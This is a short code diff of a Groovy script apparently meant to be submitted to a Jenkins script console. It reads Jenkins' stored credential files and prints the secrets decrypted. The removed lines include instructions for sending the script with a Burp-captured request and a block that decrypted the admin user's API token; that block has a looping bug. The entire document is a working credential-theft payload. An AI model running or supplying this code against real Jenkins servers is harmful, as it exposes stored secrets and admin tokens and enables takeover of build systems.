@@ -1,7 +1,3 @@
-//Here's the Jenkins groovy script we are sending. If you want to modify this:
-//paste it into the Jenkins /script page, submit it, and then capture the post created by the website.
-//Paste the captured post data into the postdata string above. Burp proxy works well for this.
-
 import hudson.util.Secret
 def env = System.getenv()
 String homedir = env['JENKINS_HOME']
@@ -32,16 +28,4 @@ while (i < matchCount) {
     println hudson.util.Secret.decrypt(jsonFile)
   }
   i = i + 1
-}
-
-String admincreds = new File(homedir + '/users/admin/config.xml').text
-def n = admincreds =~ /(<apiToken>)(.+)(<\/)/;
-adminMatchCount = n.getCount()
-
-j = 0
-while (j < adminMatchCount) {
-  if (n[j][1] == "<apiToken>") {
-    println("admin user apiToken: " + hudson.util.Secret.decrypt(n[j][2]))
-  j = i + 1
-  }
 }
